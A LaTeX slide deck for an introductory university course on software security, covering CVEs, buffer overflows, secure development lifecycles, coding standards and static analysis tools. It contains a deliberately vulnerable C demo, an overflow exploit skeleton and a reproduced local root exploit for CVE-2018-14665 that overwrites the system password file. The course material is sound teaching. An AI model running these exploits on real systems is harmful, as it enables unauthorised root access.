\documentclass[Screen16to9,17pt]{foils}
\usepackage{kea-slides}
\externaldocument{intro-to-it-security-exercises}
\selectlanguage{english}

% OB2 Softwaresikkerhed (10 ECTS)
% Indhold
% Modulet fokuserer på sikkerhedsperspektivet i software, blandt andet programkvalitet og
% fejlhåndterings samt datahåndterings betydning for en software arkitekturs sårbarheder.
% Elementet introducerer også til forskellige designprincipper, herunder ”security by design”.
% Læringsmål
% Viden
% Den studerende har viden om:
% Hvilken betydning programkvalitet har for it-sikkerhed ift.:
%* Trusler mod software
%* Kriterier for programkvalitet
%* Fejlhåndtering i programmer
%* Forståelse for security design principles, herunder:
% * security by design
% * privacy by design
% Færdigheder
% Den studerende kan:
% Tage højde for sikkerhedsaspekter ved at:
% * Programmere håndtering af forventede og uventede fejl
% * Definere lovlige og ikke-lovlige input data, bl.a. til test
%* Bruge et API og/eller standard biblioteker
% * Opdage og forhindre sårbarheder i programkoder
% * Sikkerhedsvurdere et givet software arkitektur
% Kompetencer
% Den studerende kan:
% * Håndtere risikovurdering af programkode for sårbarheder.
%* Håndtere udvalgte krypteringstiltag

\begin{document}

\mytitlepage{Introduction to Software Security}
{Introduction to IT-Security;\\Dat21 Introduction to IT Security 2023 Week 7}

\hlkprofiluk

\slide{Goals for today}

\hlkimage{6cm}{thomas-galler-hZ3uF1-z2Qc-unsplash.jpg}

Todays goals:
\begin{list2}
\item Get an overview of software security -- high level
\item Introduce the concept of a vulnerability -- CVE
\item Introduce Secure Development Life Cycle (SDLC)
\end{list2}

\hfill {\small Photo by Thomas Galler on Unsplash}

\slide{Plan for today}

\begin{list2}
\item Software Security -- buffer overflows
\item Categories of security problems -- including naming them
\item Rating criticality of security issues
\end{list2}

Exercises
\begin{list2}
\item Tool installation --
\end{list2}



\slide{Time schedule}

\begin{list1}
\item 12:30 - 13:10 Introduction to vulnerabilities
\item 5 minute break - also OK to walk around during exercises
\item 13:15 - 14:00 Introduction to buffer overflow
% Eat dinner with your family if you like
\item 15 minute break
\item 14:15 - 14:55 Structured and secure software security
\item 5 minute break - also OK to walk around during exercises
\item 15:00 - 15:45 Run a few software security tools
\end{list1}

\vskip 1cm
This will be the basic plan





\slide{Initial Overview of Software Security}

\begin{list2}
\item Security Testing Versus Traditional Software Testing
\item Functional testing does not prevent security issues!
\item SQL Injection example, injecting commands into database
\item Attackers try to break the application, server, operating system, etc.
\item Use methods like user input, memory corruption / buffer overflow, poor exception handling, broken authentication, ...
\end{list2}

\vskip 2cm
\centerline{\LARGE Where to start?}

\slide{OWASP top ten}

\hlkimage{16cm}{owasp.jpg}

\begin{quote}
The OWASP Top Ten provides a minimum standard for web application
security. The OWASP Top Ten represents a broad consensus about what
the most critical web application security flaws are.
\end{quote}

\begin{list1}
\item The Open Web Application Security Project (OWASP)
\item OWASP produces lists of the most common types of errors in web applications
\item \link{http://www.owasp.org}
\item Create Secure Software Development Lifecycle
\end{list1}



\slide{Vulnerabilities - CVE}

\begin{list1}
\item Common Vulnerabilities and Exposures (CVE):
  \begin{list2}
  \item classification
  \item identification
  \end{list2}
\item When discovered each vuln gets a CVE ID
\item CVE maintained by MITRE - not-for-profit
org for research and development in the USA.
\item National Vulnerability Database search for CVE.
\item Sources: \link{http://cve.mitre.org/} og \link{http://nvd.nist.gov}
\item also checkout OWASP Top-10 \link{http://www.owasp.org/}
\end{list1}

\slide{Sample vulnerabilities}

\begin{list1}
\item \small CVE-2000-0884\\
IIS 4.0 and 5.0 allows remote attackers to read documents outside of
the web root, and possibly execute arbitrary commands, via malformed
URLs that contain UNICODE encoded characters, aka the "Web Server
Folder Traversal" vulnerability.

\item \small CVE-2002-1182\\
IIS 5.0 and 5.1 allows remote attackers to cause a denial of service
(crash) via malformed WebDAV requests that cause a large amount of
memory to be assigned.

\item Source:\\
\link{http://cve.mitre.org/ - CVE}
\end{list1}

\centerline{And updates from vendors reference these too! A closed loop}

\slide{CWE Common Weakness Enumeration}

\hlkimage{18cm}{cwe-mitre-org.png}
\link{http://cwe.mitre.org/}

\slide{CWE/SANS Monster mitigations}

\hlkimage{13cm}{cwe-monster-mitigations.png}

Source:
\link{http://cwe.mitre.org/top25/index.html}


\slide{Local vs. remote exploits}

\begin{list1}
\item {\bfseries Local vs. remote}
angiver om et exploit er rettet mod
en sårbarhed lokalt på maskinen, eksempelvis
opnå højere privilegier, eller beregnet
til at udnytter sårbarheder over netværk
\item {\bfseries Remote root exploit}
- den type man frygter mest, idet
det er et exploit program der når det afvikles giver
angriberen fuld kontrol, root user er administrator
på Unix, over netværket.
\item {\bfseries Zero-day exploits} dem som ikke offentliggøres -- dem
  som hackere holder for sig selv. Dag 0 henviser til at ingen kender
  til dem før de offentliggøres og ofte er der umiddelbart ingen
  rettelser til de sårbarheder
\end{list1}

\slide{Computer worms}

\begin{list1}
\item {\bf Definition 23-14} A \emph{computer worm} is a program that copies itself from one computer to another.\\
Definition from Computer Security: Art and Science, Matt Bishop ISBN: 9780321712332
\item Computer worms has existed since research began mid-1970s
\item Morris Worm from November 2, 1988 was a famous example
\vskip 2cm
\item Virus, trojan or worm?\\
Unless you work specifically in the computer virus industry, call it all malware

\end{list1}


\slide{The Internet Worm 2. nov 1988}

\begin{list1}
\item Exploited the following vulnerabilities
\begin{list2}
\item buffer overflow in fingerd - VAX code
\item Sendmail - DEBUG functionality
\item Trust between systems: rsh, rexec, ...
\item Bad passwords
\end{list2}
\item Contained camouflage!
\begin{list2}
\item Program name set to 'sh'
\item Used fork() to switch PID regularly
\item Password cracking using intern list of 432 words and /usr/dict/words
\item Found systems to infect in /etc/hosts.equiv, .rhosts, .forward, netstat ...
\end{list2}
\item Made byRobert T. Morris, Jr.
\end{list1}


\slide{Stuxnet}

\begin{list1}
\item Worm in 2010 intended to infect Iran nuclear program
\item Target was the uranium enrichment process
\item Infected other industrial sites
\item SCADA, and Industrial Control Systems (ICS) are becoming very important for whole countries
\item A small \emph{community} of consultants work in these \emph{isolated} networks, but can be used as infection vector - they visit multiple sites
\item More can be found in \url{https://en.wikipedia.org/wiki/Stuxnet}
\end{list1}



\slide{Technically what is hacking}

\hlkimage{12cm}{buffer-overflow-3.pdf}



\slide{Trinity breaking in}

\hlkimage{14cm}{trinity-nmapscreen-hd-cropscale-418x250.jpg}
Very realistic -- comparable to hacking:\\
\link{https://nmap.org/movies/}\\
\link{https://youtu.be/51lGCTgqE_w}



\slide{Hacking is magic}

\hlkimage{5cm}{wizard_in_blue_hat.png}

\vskip 1 cm

\centerline{Hacking looks like magic}


\slide{Hacking is not magic}

\hlkimage{15cm}{ninjas.png}

\vskip 1 cm
\centerline{Hacking only demands ninja training and knowledge others don't have}





\slide{Buffer overflows a C problem}

\begin{list1}
\item {\bfseries A buffer overflow} is what happens when writing more data than allocated in some area of memory. Typically the program will crash, but under ce
rtain circumstances an attacker can write structures allowing take over of return addresses, parameters for system calls or program execution.
\item {\bfseries Stack protection} is today used as a generic term for multiple technologies used in operating systems, libraries, compilers etc. that protect t
he stack and other structures from being overwritten or changed through buffer overflows. StackGuard
and Propolice are examples of this.
\end{list1}

Today we will not go more into detail about this, suffice it to say modern operating systems really employ a lot of methods for making buffer overflows harder and less likely to succeed. OpenBSD even relink the kernel on installation to randomize addresses.

\slide{Buffers and stacks, simplified}

\hlkimage{18cm}{buffer-overflow-1.pdf}

\begin{minted}[fontsize=\small]{c}
main(int argc, char **argv)
{      char buf[200];
        strcpy(buf, argv[1]);
        printf("%s\n",buf);
}
\end{minted}



\slide{Overflow -- segmentation fault}

\hlkimage{18cm}{buffer-overflow-2.pdf}


\begin{list2}
\item Bad function overwrites return value!
\item Control return address
\item Run shellcode from buffer, or from other place
\end{list2}



\slide{Exploits -- abusing a vulnerability}

\begin{alltt}\footnotesize
$buffer = "";
$null = "\textbackslash{}x00";
$nop = "\textbackslash{}x90";
$nopsize = 1;
$len = 201; // what is needed to overflow, maybe 201, maybe more!
$the_shell_pointer = 0x01101d48; // address where shellcode is
# Fill buffer
for ($i = 1; $i < $len;$i += $nopsize) \{
    $buffer .= $nop;
\}
$address = pack('l', $the_shell_pointer);
$buffer .= $address;
exec "$program", "$buffer";
\end{alltt}

\begin{list2}
\item Exploit/exploit program are designed to exploit a specific vulnerability, often a specific version on a specific release on a specific CPU architecture
\item Might be a 5 line program written in Perl, Python or a C program
\item Today we often see them as modules written for Metasploit allowing it to be combined with different payloads
\end{list2}


\slide{Local vs. remote exploits}

\begin{list1}
\item {\bfseries Local vs. remote} exploit describe if the attack is done over some network, or locally on a system
\item {\bfseries Remote root exploit}
are the worst kind, since they work over the network, and gives complete control aka root on Unix
\item {\bfseries Zero-day exploits} is a term used for those exploits that suddenly pop up, without previous warning. Often found during incident response at some network. We prefer that security researchers that discover a vulnerability uses a {\bf responsible disclosure} process that involves the vendor .
\end{list1}

\slide{CVE-2018-14665 Multiple Local Privilege Escalation}

\begin{alltt}\footnotesize
#!/bin/sh
# local privilege escalation in X11 currently
# unpatched in OpenBSD 6.4 stable - exploit
# uses cve-2018-14665 to overwrite files as root.
# Impacts Xorg 1.19.0 - 1.20.2 which ships setuid
# and vulnerable in default OpenBSD.
# - https://hacker.house
echo [+] OpenBSD 6.4-stable local root exploit
cd /etc
Xorg -fp 'root:$2b$08$As7rA9IO2lsfSyb7OkESWueQFzgbDfCXw0JXjjYszKa8Aklt5RTSG:0:0:daemon:0:0:Charlie &:/root:/bin/ksh'
 -logfile master.passwd :1 &
sleep 5
pkill Xorg
echo [-] dont forget to mv and chmod /etc/master.passwd.old back
echo [+] type 'Password1' and hit enter for root
su -
\end{alltt}
Code from: \url{https://weeraman.com/x-org-security-vulnerability-cve-2018-14665-f97f9ebe91b3}

\begin{list2}
\item The X.Org project provides an open source implementation of the X Window System. X.Org security advisory: October 25, 2018
\url{https://lists.x.org/archives/xorg-announce/2018-October/002927.html}

%\item Example exploit method, write cron job - wait for shell:\\
%\url{https://www.exploit-db.com/exploits/45742}
\end{list2}



\slide{Zero day 0-day vulnerabilities}

\begin{quote}

Project Zero's team mission is to "make zero-day hard", i.e. to make it more costly to discover and exploit security vulnerabilities. We primarily achieve this by performing our own security research, but at times we also study external instances of zero-day exploits that were discovered "in the wild". These cases provide an interesting glimpse into real-world attacker behavior and capabilities, in a way that nicely augments the insights we gain from our own research.

Today, we're sharing our tracking spreadsheet for publicly known cases of detected zero-day exploits, in the hope that this can be a useful community resource:

Spreadsheet link: 0day "In the Wild"\\
\link{https://googleprojectzero.blogspot.com/p/0day.html}
\end{quote}

\begin{list2}
\item Not all vulnerabilities are found and reported to the vendors
\item Some vulnerabilities are exploited \emph{in the wild}
\end{list2}

\slide{Demo: Insecure programming buffer overflows 101}


\begin{list2}
\item Small demo program \verb+demo.c+ with built-in shell code, function \verb+the_shell+
\item Compile:
\verb+gcc -o demo demo.c+
\item Run program
\verb+./demo test+
\item Goal: Break and insert return address
\end{list2}

\begin{minted}[fontsize=\footnotesize]{c}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(int argc, char **argv)
{      char buf[10];
        strcpy(buf, argv[1]);
        printf("%s\n",buf);
}
int the_shell()
{  system("/bin/dash");  }
\end{minted}

NOTE: this demo is using the dash shell, not bash - since bash drops privileges and won't work.


\demo{ex:c-types}

\demo{ex:bufferoverflow}

\slide{GDB output}

\begin{alltt}\footnotesize
hlk@bigfoot:demo$ gdb demo
GNU gdb 5.3-20030128 (Apple version gdb-330.1) (Fri Jul 16 21:42:28 GMT 2004)
Copyright 2003 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "powerpc-apple-darwin".
Reading symbols for shared libraries .. done
(gdb) {\bf run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA}
Starting program: /Volumes/userdata/projects/security/exploit/demo/demo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Reading symbols for shared libraries . done
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal EXC_BAD_ACCESS, Could not access memory.
{\bf 0x41414140} in ?? ()
(gdb)
\end{alltt}

\slide{GDB output Debian}

\begin{alltt}\footnotesize
hlk@debian:~/demo$ gdb demo
GNU gdb (Debian 7.12-6) 7.12.0.20161007-git
Copyright (C) 2016 Free Software Foundation, Inc.
...
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from demo...(no debugging symbols found)...done.
(gdb) run `perl -e "print 'A'x24"`
Starting program: /home/hlk/demo/demo `perl -e "print 'A'x24"`
AAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000414141414141 in ?? ()
(gdb)
\end{alltt}



\slide{Exim RCE CVE-2019-10149 June}

\begin{quote}
  VULNERABILITY PATCHED... BY ACCIDENT
...

This was only recently discovered by the Qualys team while auditing older Exim versions. Now, Qualys researchers are warning Exim users to update to the 4.92 version to avoid having their servers taken over by attackers. Per the same June 2019 report on email server market share, only 4.34\% of all Exim servers run the latest 4.92 release.

In an email to Linux distro maintainers, Qualys said the vulnerability is "trivially exploitable" and expects attackers to come up with exploit code in the coming days.

This Exim flaw is currently tracked under the CVE-2019-10149 identifier, but Qualys refers to it under the name of "Return of the WIZard" because the vulnerability resembles the ancient WIZ and DEBUG vulnerabilities that impacted the Sendmail email server back in the 90s.
\end{quote}

{\footnotesize\url{https://www.zdnet.com/article/new-rce-vulnerability-impacts-nearly-half-of-the-internets-email-servers/}}

See also detailed information from the finders:\\ \url{https://www.qualys.com/2019/06/05/cve-2019-10149/return-wizard-rce-exim.txt}

\slide{Exim RCE CVE-2019-10149 July}

\hlkimage{5cm}{vojtam_Scared.png}

\begin{quote}
Issue:      A local or remote attacker can execute programs with root
            privileges - if you've an unusual configuration. For details
	    see below.
\end{quote}

\url{https://exim.org/static/doc/security/CVE-2019-13917.txt}

Not enabled in default config!

\slide{Exim RCE CVE-2019-15846 September}

\begin{quote}
The Exim mail transfer agent (MTA) software is impacted by a critical severity vulnerability present in versions 4.80 up to and including 4.92.1.

The bug allows local or unauthenticated remote attackers to execute programs with root privileges on servers that accept TLS connections.

The flaw tracked as CVE-2019-15846 — initially reported by 'Zerons' on July 21 and analyzed by Qualys' research team — is "exploitable by sending an SNI ending in a backslash-null sequence during the initial TLS handshake" which leads to RCE with root privileges on the mail server.
\end{quote}

\url{https://www.bleepingcomputer.com/news/security/critical-exim-tls-flaw-lets-attackers-remotely-execute-commands-as-root/}


\url{https://git.exim.org/exim.git/blob_plain/2600301ba6dbac5c9d640c87007a07ee6dcea1f4:/doc/doc-txt/cve-2019-15846/cve.txt}

\exercise{ex:real-vulns}

\slide{Software Development Lifecycle}

\begin{quote}
  A full lifecycle approach is the only way to achieve secure software.\\
  --Chris Wysopal
\end{quote}

\begin{list2}
\item Often security testing is an afterthought
\item Vulnerabilities emerge during design and implementation
\item Before, during and after approach is needed
\end{list2}

\slide{Secure Software Development Lifecycle}

\begin{list2}
\item SSDL represents a structured approach toward implementing and performing secure software development
\item Security issues evaluated and addressed early
\item During business analysis
\item through requirements phase
\item during design and implementation
\end{list2}

\slide{Functional specification needs to evaluate security}

\begin{list2}
\item Completeness
\item Consistency
\item Feasibility
\item Testability
\item Priority
\item Regulations
\end{list2}

Source: The Art of Software Security Testing Identifying Software Security Flaws
Chris Wysopal ISBN: 9780321304865

\slide{Phases of SSDL}

\begin{list2}
\item Phase 1: Security Guidelines, Rules, and Regulations
\item Phase 2: Security requirements: attack use cases
\item Phase 3: Architectural and design reviews/threat modelling
\item Phase 4: Secure coding guidelines
\item Phase 5: Black/gray/white box testing
\item Phase 6: Determining exploitability
\end{list2}

Secure deployment comes next after this.

\slide{Secure Coding Best Practices Handbook from Veracode}

\begin{list2}
\item {\bf \#01 Verify for Security Early and Often}
\item \#02 Parameterize Queries
\item \#03 Encode Data
\item \#04 Validate All Inputs
\item \#05 Implement Identity and
Authentication Controls
\item \#06 Implement Access Controls
\item \#07 Protect Data
\item \#08 Implement Logging
and Intrusion Detection
\item \#09 Leverage Security
Frameworks and Libraries
\item \#10 Monitor Error and Exception
Handling
\end{list2}

{https://info.veracode.com/secure-coding-best-practices-hand-book-guide-resource.html}


\slide{Microsoft Secure Development Lifecycle}

There are five major threat modeling steps:
\begin{list2}
\item Defining security requirements.
\item Creating an application diagram.
\item Identifying threats.
\item Mitigating threats.
\item Validating that threats have been mitigated.
Threat modeling should be part of your routine development lifecycle, enabling you to progressively refine your threat model and further reduce risk.
\end{list2}

Sources:\\
\url{https://www.microsoft.com/en-us/securityengineering/sdl}\\
\url{https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling}


\slide{Example applications from Microsoft}

Microsoft has released sample applications.

\begin{quote}
Secure Development Documentation
Learn how to develop and deploy secure applications on Azure with our sample apps, best practices, and guidance.

Get started
Develop a secure web application on Azure
\end{quote}

Source:
\url{https://docs.microsoft.com/en-us/azure/security/develop/}

Yes, this describes how to run Alpine Linux on their Azure Cloud.


\slide{OWASP Web Security Testing Guide}

\begin{quote}
The Web Security Testing Guide (WSTG) Project produces the premier cybersecurity
testing resource for web application developers and security professionals.

The WSTG is a comprehensive guide to testing the security of web applications and
web services. Created by the collaborative efforts of cybersecurity professionals
and dedicated volunteers, the WSTG provides a framework of best practices used by
penetration testers and organizations all over the world.
\end{quote}

\begin{list2}
\item Project from OWASP:\\
\link{https://owasp.org/www-project-web-security-testing-guide/}
\item Use the Tab \emph{Release Versions} to download version 4.2 in PDF
\item Also available as a checklist \verb+OWASPv4_Checklist.xlsx+
\end{list2}


\slide{Security in the Software Development Life Cycle (SDLC)}

\hlkimage{6cm}{OWASP-SDLC.jpg}

\begin{quote}\small{\bf
When to Test?}\\
Most people today don’t test software until it has already been created and is in the deployment phase of its life cycle (i.e., code has been created and instantiated into a working web application). This is generally a very ineffective and cost-prohibitive practice. One of the best methods to prevent security bugs from appearing in production applications is to improve the Software Development Life Cycle (SDLC) by including security in each of its phases.
\end{quote}
Source: OWASP Web Security Testing Guide

\slide{Low hanging fruits - easy }

%billede af nogle frugter
\hlkimage{10cm}{38-line-drawing-of-a-pare-fruit.png}

\centerline{Higher quality software is often more secure}

\slide{Coding standards - style}

\begin{quote}
This file specifies the preferred style for kernel source files in the
OpenBSD source tree.  It is also a guide for preferred user land code
style.  These guidelines should be followed for all new code.  In general,
code can be considered ``new code'' when it makes up about 50% or
more of the file(s) involved. ...\\
Use queue(3) macros rather than rolling your own lists, whenever possible.
Thus, the previous example would be better written:
\end{quote}

\begin{minted}[fontsize=\small]{c}
    #include <sys/queue.h>
    struct  foo {
    LIST_ENTRY(foo) link;  /* Queue macro glue for foo lists */
               struct  mumble amumble; /* Comment for mumble */
               int     bar;
    };
    LIST_HEAD(, foo) foohead;     /* Head of global foo list */
\end{minted}


OpenBSD style(9)

\slide{Coding standards functions}

\begin{quote}
The following copies as many characters from input to buf as will fit and
NUL terminates the result.  Because strncpy() does not guarantee to NUL
terminate the string itself, it must be done by hand.
\end{quote}

\begin{minted}[fontsize=\small]{c}
        char buf[BUFSIZ];

        (void)strncpy(buf, input, sizeof(buf) - 1);
        buf[sizeof(buf) - 1] = '\0';
\end{minted}

\begin{quote}
Note that \verb+strlcpy(3)+ is a better choice for this kind of operation.  The
equivalent using \verb+strlcpy(3)+ is simply:
\end{quote}
\begin{minted}[fontsize=\small]{c}
        (void)strlcpy(buf, input, sizeof(buf));
\end{minted}

OpenBSD strcpy(9)

\slide{Compiler warnings - gcc -Wall}

\begin{minted}[fontsize=\small]{bash}
# gcc -o demo demo.c
demo.c: In function main:
demo.c:4: warning: incompatible implicit declaration of built-in
function strcpy
\end{minted}

\begin{minted}[fontsize=\small]{bash}
# gcc -Wall -o demo demo.c
demo.c:2: warning: return type defaults to int
demo.c: In function main:
demo.c:4: warning: implicit declaration of function strcpy
demo.c:4: warning: incompatible implicit declaration of built-in
function strcpy
demo.c:5: warning: control reaches end of non-void function
\end{minted}

\vskip 15mm
\centerline{\bf\LARGE\color{security6blue}Easy to do!}

\slide{No warnings = no errors?}

\begin{minted}[fontsize=\small]{c}
# cat demo2.c
#include <strings.h>
int main(int argc, char **argv)
{
    char buf[200];
    strcpy(buf, argv[1]);
    return 0;
}
# gcc -Wall -o demo2 demo2.c
\end{minted}

\vskip 1cm
\centerline{\bf\large\color{security6blue}This is an insecure program, but no warnings!}

(cheating, some compilers actually warn today)

\slide{Version control sample hooks scripts}

\begin{list1}
\item Before checking in code in version control,  pre-commit - check
\begin{list2}
\item case-insensitive.py
\item check-mime-type.pl
\item commit-access-control.pl
\item commit-block-joke.py
\item detect-merge-conflicts.sh
\item enforcer
\item log-police.py
\item pre-commit-check.py
\item verify-po.py
\end{list2}
\item \link{http://subversion.tigris.org/tools_contrib.html}
\item \link{http://svn.collab.net/repos/svn/trunk/contrib/hook-scripts/}
\end{list1}

This references Subversion, which is not used much anymore. Just to show the concept is NOT new. Use hooks!

\slide{Example Enforcer}

\begin{alltt}
In a Java project I work on, we use log4j extensively.  Use of
System.out.println() bypasses the control that we get from log4j,
so we would like to discourage the addition of println calls in
our code.

We want to deny any commits that add a println into the code.
The world being full of exceptions, we do need a way to allow
some uses of println, so we will allow it if the line of code
that calls println ends in a comment that says it is ok:

   System.out.println("No log4j here"); // (authorized)
\end{alltt}

{\small \link{http://svn.collab.net/repos/svn/trunk/contrib/hook-scripts/enforcer/enforcer}}



\slide{Example verify-po.py}

\begin{minted}[fontsize=\small]{python}
#!/usr/bin/env python
"""This is a pre-commit hook that checks whether the contents
of PO files committed to the repository are encoded in UTF-8.
"""
\end{minted}

{\small \link{http://svn.collab.net/repos/svn/trunk/tools/hook-scripts/verify-po.py}}

\slide{Design for security - more work}

\hlkimage{14cm}{johnny_automatic_blueprints.png}
\centerline{Security is cheapest and most effective when done during design phase.}


\slide{Secure Coding starts with the design}

%\hlkimage{5cm}{secure_coding.png}

\vskip 2cm
\hlkrightimage{4cm}{secure_coding.png}
{\emph{Secure Coding: Principles and Practices} af Mark G. Graff, Kenneth R. Van Wyk 2003}



\begin{list1}
\item Architecture/design -- while you are thinking about the application
\item Implementation -- while you are writing the application
\item Operations -- After the application is in production
\item Ca. 200 pages, very dense.
\end{list1}


\slide{Sins in Software Security}

\hlkrightimage{4cm}{24-deadly.jpg}
{\emph{24 Deadly Sins of Software Security} af Michael Howard, David Leblanc, John Viega 2010}

\begin{list1}
\item Should be mandatory reading for all developers
\item Authors have written other great books
\item This book is very precise and gives a good overview
\end{list1}

\slide{Deadly Sins 1/2}

\begin{list1}
\item Part I Web Application Sins 1-4
\begin{quote}
1) SQL Injection
2) Web Server-Related Vulnerabilities
3) Web Client-Related Vulnerabilities (XSS)
4) Use of Magic URLs, Predictable Cookies, and Hidden Form Fields
\end{quote}
\item Part II Implementation Sins 5-18
\begin{quote}
5) Buffer Overruns, 6) Format String, 7) Integer Overflows,
8) C++ Catastrophes, 9) Catching Exceptions, 10) Command Injection
11) Failure to Handle Errors Correctly 12) Information Leakage
13) Race Conditions 14) Poor Usability
15) Not Updating Easily
16) Executing Code with Too Much Privilege
17) Failure to Protect Stored Data
18) The Sins of Mobile Code
\end{quote}
\end{list1}



\slide{Deadly Sins 2/2}

\begin{list1}
\item Part III Cryptographic Sins 19-21
\begin{quote}
19) Use of Weak Password-Based System
20) Weak Random Numbers
21) Using Cryptography Incorrectly
\end{quote}
\item Part IV Networking Sins 22-24
\begin{quote}
22) Failing to Protect Network Traffic,
23) Improper use of PKI, Especially SSL,
24) Trusting Network Name Resolution
\end{quote}
\end{list1}

\vskip 2cm
\centerline{\Large Still want to program in C?}


\slide{Testing - more work now, less work in the long run}

% noget QA relateret, måske logo fra Hudson?
%checkmark
\hlkimage{12cm}{testing.pdf}


\slide{Unit testing - low level / functions}

\begin{minted}[fontsize=\small]{java}
public class TestAdder {
    public void testSum() {
        Adder adder = new AdderImpl();
        assert(adder.add(1, 1) == 2);
        assert(adder.add(1, 2) == 3);
        assert(adder.add(2, 2) == 4);
        assert(adder.add(0, 0) == 0);
        assert(adder.add(-1, -2) == -3);
        assert(adder.add(-1, 1) == 0);
        assert(adder.add(1234, 988) == 2222);
    }
}
\end{minted}

\begin{list1}
\item Test individual functions
\item Example from \link{http://en.wikipedia.org/wiki/Unit_testing}
\item Avoid regressions, old errors reappearing
\end{list1}

\slide{Analysis}

%\hlkimage{10cm}{Magnifying_Glass.png}
\hlkimage{12  cm}{buffer-overflow-3.pdf}

\centerline{Use tools for analysing code and applications}

\slide{Analyze}

\begin{list2}
\item  {\Large Static analysis}\\
Checks source code without running the program\\
Find bad programming constructs with flaws, wrong functions to use, wrong use of functions
\item {\Large Dynamic analysis}\\
These tools run the program and analyze data from execution, often with some test harness
\end{list2}

\slide{Static analysis tools}
\begin{list1}
\item Flawfinder \link{http://www.dwheeler.com/flawfinder/}
\item RATS Rough Auditing Tool for Security, C, C++, Perl, PHP and Python
\item PMD static ruleset based Java
\item See more at Wikipedia \\
\link{http://en.wikipedia.org/wiki/List_of_tools_for_static_code_analysis}
\end{list1}

\slide{A Fool with a Tool is still a Fool}

\begin{list1}
\item 1. Run tool
\item 2. Fix problems
\item 3. Rinse repeat
\end{list1}

Fixing problems?\\
If you instruct the tool to ignore some bad construct, you have not fixed it
\begin{minted}[fontsize=\small]{c}
   char tmp[256]; /* Flawfinder: ignore */
   strcpy(tmp, pScreenSize); /* Flawfinder: ignore */
\end{minted}
Source: \link{http://www.dwheeler.com/flawfinder/}




\exercise{ex:git-hook}

\exercise{ex:pmd-static}

\exercise{ex:juice-shop-login}

%\slidenext{Buy the books!}


\end{document}
